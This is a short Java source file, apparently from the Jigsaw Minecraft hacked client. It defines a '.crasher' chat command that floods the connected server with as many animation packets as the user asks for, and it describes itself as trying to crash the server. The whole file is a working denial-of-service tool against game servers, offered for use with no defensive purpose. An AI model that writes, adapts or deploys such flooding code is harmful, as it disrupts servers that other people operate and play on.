package me.robbanrobbin.jigsaw.client.commands;

import me.robbanrobbin.jigsaw.client.main.Jigsaw;
import net.minecraft.network.play.client.C0APacketAnimation;

public class CommandCrasher extends Command {

	@Override
	public void run(String[] commands) {
		if (commands.length < 2) {
			Jigsaw.chatMessage("§Enter a number!");
			return;
		}
		try {
			int amount = Integer.parseInt(commands[1]);
			C0APacketAnimation packet = new C0APacketAnimation();
			for (int i = 0; i < amount; i++) {
				sendPacketFinal(packet);
			}
			Jigsaw.chatMessage("Sent §6" + amount + "§7 packets!");
		} catch (NumberFormatException e) {
			Jigsaw.chatMessage("§Enter a valid integer!");
			return;
		}
	}

	@Override
	public String getActivator() {
		return ".crasher";
	}

	@Override
	public String getSyntax() {
		return ".crasher <amount>";
	}

	@Override
	public String getDesc() {
		return "Tries to crash the server!";
	}
}
